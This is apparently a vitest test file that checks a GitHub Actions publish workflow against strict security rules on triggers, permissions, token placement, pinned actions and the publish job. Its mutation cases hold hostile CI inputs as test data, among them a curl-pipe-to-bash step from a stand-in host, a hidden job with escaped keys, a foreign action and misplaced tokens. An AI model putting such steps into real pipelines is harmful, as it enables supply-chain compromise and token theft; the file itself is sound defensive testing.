import { readFileSync } from "node:fs";
import { resolve } from "node:path";

import { describe, expect, it } from "vitest";
import { parse } from "yaml";

// U10-b (DAN-742), invariant 5: publish.yml as GitHub reads it, parsed YAML
// (escapes, quoted keys, flow mappings and aliases resolved), checked against
// exact allow lists. Comments are only read for the version of each pin.
const ROOT = resolve(import.meta.dirname, "../..");
const PUBLISH = readFileSync(resolve(ROOT, ".github/workflows/publish.yml"), "utf8");
const CI = readFileSync(resolve(ROOT, ".github/workflows/ci.yml"), "utf8");
const NODE = readFileSync(resolve(ROOT, ".nvmrc"), "utf8").trim();

const pin = (action: string, sha: string) => `actions/${action}@${sha}`;
const CHECKOUT = pin("checkout", "3d3c42e5aac5ba805825da76410c181273ba90b1");
const SETUP_NODE = pin("setup-node", "949feb2413d6458794dcd2491c4babbbce0c15c1");
const UPLOAD = pin("upload-artifact", "cf430e030ddbb5b0abf93d22962f4752f3646cd9");
const DOWNLOAD = pin("download-artifact", "9000827ccba6bdab643e8b6fd33ac0654aef8333");
const PNPM = "pnpm/action-setup@ea17c68df8912ef543352723c149a84f56e3d413";

const TAGS = ["contracts-v*.*.*", "test-fakes-v*.*.*"];
const FILE = "${{ needs.verify.outputs.file }}";
const TOKEN = "${{ secrets.GITHUB_TOKEN }}";
const TOKEN_AT = "jobs.publish.steps.3.env.NODE_AUTH_TOKEN";
// Every expression the workflow may hold: where, and exactly what.
const EXPRESSIONS: Readonly<Record<string, string>> = {
  "concurrency.group": "publish-${{ github.ref }}",
  "jobs.verify.outputs.file": "${{ steps.tarball.outputs.file }}",
  "jobs.verify.outputs.sha256": "${{ steps.tarball.outputs.sha256 }}",
  "jobs.verify.steps.9.env.PACKAGE": "${{ steps.tag.outputs.package }}",
  "jobs.verify.steps.10.with.path": "dist/release/tarball/${{ steps.tarball.outputs.file }}",
  "jobs.publish.steps.2.env.FILE": FILE,
  "jobs.publish.steps.2.env.SHA256": "${{ needs.verify.outputs.sha256 }}",
  "jobs.publish.steps.3.env.FILE": FILE,
  [TOKEN_AT]: TOKEN,
};
const VERIFY_RUNS = [
  "pnpm install --frozen-lockfile",
  "pnpm release:tag",
  "pnpm typecheck",
  "pnpm test:unit",
  "pnpm test:integration",
  "pnpm release:check",
  'pnpm release:tarball "$PACKAGE"',
];
// 5f: the job that may write packages, in full. No checkout, no pnpm, no
// repository code; the sha256 of verify's file, then npm publish of that file.
const PUBLISH_JOB = {
  name: "Objava na GitHub Packages",
  needs: "verify",
  "runs-on": "ubuntu-latest",
  "timeout-minutes": 10,
  environment: "packages",
  permissions: { contents: "read", packages: "write" },
  steps: [
    {
      uses: SETUP_NODE,
      with: {
        "node-version": NODE,
        "package-manager-cache": false,
        "registry-url": "https://npm.pkg.github.com",
        scope: "@ductura",
      },
    },
    { uses: DOWNLOAD, with: { name: "release-tarball", path: "release" } },
    {
      name: "Provjera sha256",
      env: Object.fromEntries([
        ["FILE", FILE],
        ["SHA256", "${{ needs.verify.outputs.sha256 }}"],
      ]),
      run: [
        '[[ "$FILE" =~ ^ductura-(contracts|test-fakes)-[0-9]+\\.[0-9]+\\.[0-9]+\\.tgz$ ]]',
        '[[ "$SHA256" =~ ^[0-9a-f]{64}$ ]]',
        '[ "$(find release -type f | wc -l)" -eq 1 ]',
        'printf \'%s  %s\\n\' "$SHA256" "release/$FILE" | sha256sum --check --strict -',
        "",
      ].join("\n"),
    },
    {
      name: "Objava",
      env: Object.fromEntries([
        ["FILE", FILE],
        ["NODE_AUTH_TOKEN", TOKEN],
      ]),
      run: 'npm publish --ignore-scripts "./release/$FILE"',
    },
  ],
};

type Node = Record<string, unknown>;
const keys = (value: unknown) => Object.keys((value ?? {}) as Node).join(",");
const same = (a: unknown, b: unknown) => JSON.stringify(a) === JSON.stringify(b);

/** [path, value] of every string in `value`, with dotted paths. */
function strings(value: unknown, path = ""): [string, string][] {
  if (typeof value === "string") return [[path, value]];
  if (typeof value !== "object" || value === null) return [];
  return Object.entries(value).flatMap(([key, child]) =>
    strings(child, path === "" ? key : `${path}.${key}`),
  );
}

const STEP_KEYS = ["name", "id", "uses", "with", "env", "run"];

/** Every rule of invariant 5 that the workflow text breaks. */
export function publishErrors(text: string): string[] {
  const errors: string[] = [];
  let doc: Node;
  try {
    doc = parse(text, { uniqueKeys: true, merge: false }) as Node;
  } catch (error) {
    return [`not YAML: ${String(error)}`];
  }
  const jobs = (doc.jobs ?? {}) as Record<string, Node>;
  const verify = jobs.verify ?? {};
  const steps = (verify.steps ?? []) as Node[];
  // 5a: only push of the two tag patterns; nothing else at the top.
  if (keys(doc) !== "name,on,permissions,concurrency,jobs") errors.push(`top: ${keys(doc)}`);
  if (!same(doc.on, { push: { tags: TAGS } })) errors.push("trigger is not the two tag patterns");
  // 5b: nothing at the top, read in verify, packages: write only in publish.
  if (!same(doc.permissions, {})) errors.push("top permissions are not {}");
  if (keys(jobs) !== "verify,publish") errors.push(`jobs: ${keys(jobs)}`);
  if (keys(verify) !== "name,runs-on,timeout-minutes,permissions,outputs,steps")
    errors.push(`verify keys: ${keys(verify)}`);
  if (!same(verify.permissions, { contents: "read" })) errors.push("verify may write");
  // 5c, 5e: every expression in its one place with its one value, so the
  // token is only in the npm publish step and no run holds an expression.
  for (const [path, value] of strings(doc)) {
    if (value.includes("${{") && EXPRESSIONS[path] !== value)
      errors.push(`expression at ${path}: ${value}`);
    if (/secrets\.|github\.token/u.test(value) && path !== TOKEN_AT)
      errors.push(`token at ${path}`);
  }
  // 5d: every action pinned to a full SHA, with its version as a comment.
  for (const [, uses = ""] of text.matchAll(/^\s*(?:- )?uses: (.*)$/gmu))
    if (!/^[a-z0-9-]+\/[a-z0-9-]+@[0-9a-f]{40} # v\d+\.\d+\.\d+$/u.test(uses))
      errors.push(`not pinned: ${uses}`);
  // 5f: publish is exactly PUBLISH_JOB.
  if (!same(jobs.publish, PUBLISH_JOB)) errors.push("publish is not the expected job");
  // DAN-742: npm reads a bare "dir/file.tgz" as the GitHub shorthand owner/repo
  // and tries git over ssh, so every tarball npm publish gets starts with "./".
  for (const [path, value] of strings(jobs.publish, "jobs.publish"))
    for (const [, spec = ""] of value.matchAll(/npm publish(?: --[a-z-]+)* "?([^"\s]+)/gu))
      if (!spec.startsWith("./"))
        errors.push(`npm publish of a non-local path at ${path}: ${spec}`);
  // 5g and verify: known actions with exact inputs, no cache, no credentials
  // kept, no condition, shell or env that changes a step; the checks in order.
  const inputs: Readonly<Record<string, unknown>> = {
    [CHECKOUT]: { "fetch-depth": 0, "persist-credentials": false },
    [PNPM]: undefined,
    [SETUP_NODE]: { "node-version-file": ".nvmrc", "package-manager-cache": false },
    [UPLOAD]: {
      name: "release-tarball",
      path: EXPRESSIONS["jobs.verify.steps.10.with.path"],
      "if-no-files-found": "error",
      "retention-days": 1,
    },
  };
  for (const [i, step] of steps.entries()) {
    const uses = step.uses === undefined ? undefined : String(step.uses);
    if (Object.keys(step).some((key) => !STEP_KEYS.includes(key)))
      errors.push(`verify step ${i}: ${keys(step)}`);
    if (uses !== undefined && (!(uses in inputs) || !same(step.with, inputs[uses])))
      errors.push(`verify step ${i}: ${uses}`);
    if (step.env !== undefined && i !== 9) errors.push(`verify step ${i}: env`);
  }
  const runs = steps.flatMap((step) => (step.run === undefined ? [] : [step.run]));
  if (!same(runs, VERIFY_RUNS)) errors.push(`verify runs: ${runs.join(" | ")}`);
  if (steps[0]?.uses !== CHECKOUT || steps.at(-1)?.uses !== UPLOAD)
    errors.push("verify does not start with checkout and end with the upload");
  return errors;
}

describe("publish.yml", () => {
  it("keeps every rule of invariant 5", () => {
    expect(publishErrors(PUBLISH)).toEqual([]);
  });

  const replace = (from: string, to: string) => {
    expect(PUBLISH, from).toContain(from);
    return PUBLISH.replace(from, to);
  };
  const tags = '    tags: ["contracts-v*.*.*", "test-fakes-v*.*.*"]\n';
  const publishStep = '        run: npm publish --ignore-scripts "./release/$FILE"\n';
  const sha = "      - name: Provjera sha256\n";
  const tagStep = "        run: pnpm release:tag\n";

  it.each([
    ["5a pull_request", tags, `${tags}  pull_request:\n`],
    ["5a pull_request_target", tags, `${tags}  pull_request_target:\n`],
    ["5a workflow_dispatch", tags, `${tags}  workflow_dispatch:\n`],
    ["5a workflow_run", tags, `${tags}  workflow_run:\n    workflows: [CI]\n`],
    ["5a a trigger after a blank line", tags, `${tags}\n  issue_comment:\n    types: [created]\n`],
    ["5a push branches", tags, `${tags}    branches: [main]\n`],
    ["5a a third pattern", '"test-fakes-v*.*.*"]', '"test-fakes-v*.*.*", "*"]'],
    ["5a a top-level env", "permissions: {}\n", "env: { A: b }\npermissions: {}\n"],
    ["5b packages: write at the top", "permissions: {}\n", "permissions: { packages: write }\n"],
    ["5b write-all", "permissions: {}\n", "permissions: write-all\n"],
    [
      "5b packages: write in verify",
      "      contents: read\n    outputs:",
      "      contents: read\n      packages: write\n    outputs:",
    ],
    [
      "5b contents: write in publish",
      "      contents: read\n      packages: write",
      "      contents: write\n      packages: write",
    ],
    [
      "5b id-token in publish",
      "      packages: write\n",
      "      packages: write\n      id-token: write\n",
    ],
    [
      "5b a hidden job with escaped keys",
      publishStep,
      `${publishStep}  evil: # x\n    runs-on: ubuntu-latest\n    "perm\\x69ssions": { packages: "wr\\x69te" }\n    steps:\n      - run: echo\n`,
    ],
    [
      "5b an underscore job",
      publishStep,
      `${publishStep}  evil_job:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\n`,
    ],
    [
      "5c token in verify",
      "          PACKAGE: ${{",
      `          T: ${TOKEN}\n          PACKAGE: \${{`,
    ],
    [
      "5c token in the job env",
      "    environment: packages\n",
      `    environment: packages\n    env:\n      NODE_AUTH_TOKEN: ${TOKEN}\n`,
    ],
    [
      "5c github.token",
      "          PACKAGE: ${{",
      "          T: ${{ github.token }}\n          PACKAGE: ${{",
    ],
    ["5c another secret", "secrets.GITHUB_TOKEN", "secrets.NPM_TOKEN"],
    ["5d a tag", `${CHECKOUT} # v7.0.1`, "actions/checkout@v7 # v7.0.1"],
    ["5d a short SHA", `${DOWNLOAD} # v8.0.2`, "actions/download-artifact@9000827 # v8.0.2"],
    ["5d no version comment", `${DOWNLOAD} # v8.0.2`, DOWNLOAD],
    [
      "5e ref_name in run",
      'pnpm release:tarball "$PACKAGE"',
      "pnpm release:tarball ${{ github.ref_name }}",
    ],
    [
      "5e ref_name through env",
      "PACKAGE: ${{ steps.tag.outputs.package }}",
      "PACKAGE: ${{ github.ref_name }}",
    ],
    [
      "5e event in run",
      "run: pnpm release:tag",
      "run: echo ${{ github.event.ref }} && pnpm release:tag",
    ],
    [
      "5e output in a run block",
      '"release/$FILE" | sha256sum',
      '"release/${{ needs.verify.outputs.file }}" | sha256sum',
    ],
    [
      "5f checkout in publish",
      sha,
      `      - uses: ${CHECKOUT} # v7.0.1\n        with:\n          persist-credentials: false\n${sha}`,
    ],
    ["5f pnpm install in publish", sha, `      - run: pnpm install --frozen-lockfile\n${sha}`],
    [
      "5f a downloaded script in publish",
      sha,
      `      - run: curl -fsSL https://example.invalid/x.sh | bash\n${sha}`,
    ],
    [
      "5f another action in publish",
      sha,
      `      - uses: evil-org/evil-action@${"a".repeat(40)} # v1.0.0\n${sha}`,
    ],
    ["5f continue-on-error on the sha256 check", sha, `${sha}        continue-on-error: true\n`],
    ["5f a shell without -e", sha, `${sha}        shell: bash {0}\n`],
    ["5f if: always() on publish", "    needs: verify\n", "    needs: verify\n    if: always()\n"],
    ["5f without --ignore-scripts", "npm publish --ignore-scripts", "npm publish"],
    // DAN-742: the first publish failed on this; npm took it for owner/repo.
    ["5f a tarball npm reads as a GitHub shorthand", '"./release/$FILE"', '"release/$FILE"'],
    ["5f without the sha256 check", "sha256sum --check --strict -", "cat"],
    ["5f publish without verify", "    needs: verify\n", ""],
    ["5f publish without the environment", "    environment: packages\n", ""],
    ["5f another node", 'node-version: "24"', 'node-version: "22"'],
    [
      "5g a checkout with credentials",
      "          fetch-depth: 0\n          persist-credentials: false\n",
      "          fetch-depth: 0\n",
    ],
    [
      "5g a cache in verify",
      "          package-manager-cache: false\n      - run: pnpm",
      "          cache: pnpm\n      - run: pnpm",
    ],
    [
      "verify: continue-on-error on the tag check",
      tagStep,
      `${tagStep}        continue-on-error: true\n`,
    ],
    ["verify: an if on the tag check", tagStep, `${tagStep}        if: false\n`],
    ["verify: without the tag check", tagStep, "        run: echo\n"],
    [
      "verify: the tag check after the tests",
      `${tagStep}      - name: Provjera tipova\n        run: pnpm typecheck\n`,
      `        run: pnpm typecheck\n      - name: Provjera tipova\n${tagStep}`,
    ],
    ["a duplicate key", "permissions: {}\n", "permissions: {}\npermissions: {}\n"],
  ])("refuses %s", (_, from, to) => {
    expect(publishErrors(replace(from, to))).not.toEqual([]);
  });

  it.each(['"release/$FILE"', "release/$FILE", '"$FILE"'])(
    "names npm publish of %s as a non-local path (DAN-742)",
    (spec) => {
      expect(publishErrors(replace('"./release/$FILE"', spec))).toContain(
        `npm publish of a non-local path at jobs.publish.steps.3.run: ${spec.replaceAll('"', "")}`,
      );
    },
  );
});

describe("ci.yml", () => {
  it("runs the publish path without the upload and without a token on every PR", () => {
    const doc = parse(CI) as { jobs: { checks: { steps: Node[] } } };
    const step = doc.jobs.checks.steps.find((s) => s.name === "Probna objava");
    expect(step?.run).toBe(
      [
        "pnpm release:check",
        "pnpm release:tarball contracts test-fakes",
        'for file in dist/release/tarball/*.tgz; do npm publish --dry-run --ignore-scripts "$file"; done',
        "",
      ].join("\n"),
    );
    expect(keys(step)).toBe("name,run");
    const tokens = strings(doc).filter(([, value]) =>
      /secrets\.|github\.token|NODE_AUTH/u.test(value),
    );
    expect(tokens).toEqual([]);
  });
});
